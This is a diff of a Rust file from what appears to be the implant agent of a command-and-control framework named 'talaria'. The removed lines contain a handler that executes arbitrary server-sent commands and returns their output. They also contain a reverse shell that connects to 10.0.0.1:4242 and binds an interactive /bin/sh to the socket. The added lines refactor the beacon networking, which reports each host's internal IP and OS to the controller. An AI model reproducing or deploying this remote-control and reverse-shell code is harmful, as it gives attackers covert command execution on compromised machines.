@@ -1,104 +1,87 @@
-use crate::agent::AgentContext;
-use talaria::helper::*;
+use anyhow::Result;
+use local_ip_address::local_ip;
+use rand::rngs::{OsRng, StdRng};
+use rand::{Rng, SeedableRng, TryRngCore};
+use reqwest::{Client, Url};
+use talaria::helper::current_time;
 use talaria::protocol::*;
 
-use anyhow::Result;
-use std::net::TcpStream;
-use std::os::fd::AsRawFd;
-use std::os::fd::FromRawFd;
-use std::process::Command;
-use std::process::Output;
-use std::process::Stdio;
+use crate::agent::AgentContext;
 
-pub async fn handle_response(agent: &mut AgentContext, response: AgentInstruction) -> Result<()> {
-    match response.packet_body {
-        AgentInstructionBody::Command {
-            ref command,
-            ref command_id,
-            ref args,
-        } => {
-            devlog!(
-                "Executing Command: {:?}, ID: {:?}, Args: {:?}",
-                command,
-                command_id,
-                args
-            );
+pub struct Network {
+    url: Url,
+    rand: StdRng,
+    used_packet_ids: Vec<u32>,
+    http_client: Client,
+}
 
-            // Execute the received command with arguments
-            let output: Output = Command::new(command).args(args).output()?;
+impl Network {
+    // We loop here to prevent collisions,
+    // it's incredibly unlikely, but 10k ids is 0.04mb so it doesn't quite matter
+    /// Generate unique IDs for Packets, Commmands, and other structs
+    fn gen_packet_id(&mut self) -> u32 {
+        loop {
+            let id = self.rand.random::<u32>();
 
-            // Capture stdout, stderr, and status code
-            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
-            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
-            let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available
-
-            // Print the output for debugging
-            devlog!("Command Output: \nSTDOUT: {}\nSTDERR: {}", stdout, stderr);
-
-            // Prepare the response to send back to the server
-            let agent_response = AgentResponse {
-                packet_header: agent.generate_packet_header(),
-                packet_body: AgentResponseBody::CommandResponse {
-                    command: command.to_string(),
-                    command_id: *command_id,
-                    status_code,
-                    stdout, // Send the actual command output (stdout) as the response
-                    stderr,
-                },
-            };
-
-            // Send the response back to the server with the actual command output
-            make_request(agent, agent_response).await?;
-        }
-        AgentInstructionBody::RequestHeartbeat => {
-            devlog!("Received heartbeat request from server.");
-        }
-        AgentInstructionBody::Ok => {
-            devlog!("Server acknowledged previous operation.");
-        }
-        AgentInstructionBody::SpawnShell => {
-            let s = TcpStream::connect("10.0.0.1:4242").unwrap();
-            let fd = s.as_raw_fd();
-            Command::new("/bin/sh")
-                .arg("-i")
-                .stdin(unsafe { Stdio::from_raw_fd(fd) })
-                .stdout(unsafe { Stdio::from_raw_fd(fd) })
-                .stderr(unsafe { Stdio::from_raw_fd(fd) })
-                .spawn()
-                .unwrap()
-                .wait()
-                .unwrap();
+            if !self.used_packet_ids.contains(&id) {
+                self.used_packet_ids.push(id);
+                return id;
+            }
         }
     }
 
-    devlog!("Processed Response: {:#?}", response);
-    Ok(())
-}
+    fn gen_packet_header(&mut self, agent: &AgentContext) -> PacketHeader {
+        let internal_ip = match local_ip() {
+            Ok(ip) => ip.to_string(),
+            Err(_) => "?".to_string(),
+        };
 
-pub async fn send_heartbeat(agent: &mut AgentContext) -> Result<AgentInstruction> {
-    let response = AgentResponse {
-        packet_header: agent.generate_packet_header(),
-        packet_body: AgentResponseBody::Heartbeat,
-    };
+        PacketHeader {
+            agent_id: agent.agent_id,
+            timestamp: current_time(),
+            packet_id: self.gen_packet_id(),
+            polling_interval_ms: agent.polling_interval_millis,
+            internal_ip,
+            os: agent.os.clone(),
+        }
+    }
 
-    make_request(agent, response).await
-}
+    pub fn gen_response(
+        &mut self,
+        response_body: AgentResponseBody,
+        agent: &AgentContext,
+    ) -> AgentResponse {
+        let header = self.gen_packet_header(agent);
 
-/// Serializes and sends an AgentResponse,
-/// returns a deserialized AgentInstruction
-async fn make_request(
-    agent: &mut AgentContext,
-    request: AgentResponse,
-) -> Result<AgentInstruction> {
-    let request = AgentResponse::serialize(&request)?;
-    let response = agent
-        .http_client
-        .post(agent.url.join("agent/monolith")?)
-        .body(request)
-        .send()
-        .await?;
+        AgentResponse {
+            packet_header: header,
+            packet_body: response_body,
+        }
+    }
 
-    let bytes = response.bytes().await?;
-    let instruction = AgentInstruction::deserialize(&bytes.to_vec());
-    Ok(instruction?)
+    pub async fn send_response(&self, response: AgentResponse) -> Result<AgentInstruction> {
+        let net_response = self
+            .http_client
+            .post(self.url.join("agent/monolith")?)
+            .body(AgentResponse::serialize(&response)?)
+            .send()
+            .await?;
+
+        let bytes = net_response.bytes().await?;
+        let instruction = AgentInstruction::deserialize(&bytes.to_vec());
+
+        Ok(instruction?)
+    }
+
+    pub fn new(url: Url) -> Network {
+        let mut seed = [0u8; 32];
+        OsRng.try_fill_bytes(&mut seed).unwrap();
+
+        Network {
+            url,
+            rand: rand::rngs::StdRng::from_seed(seed),
+            used_packet_ids: vec![].into(),
+            http_client: Client::new(),
+        }
+    }
 }
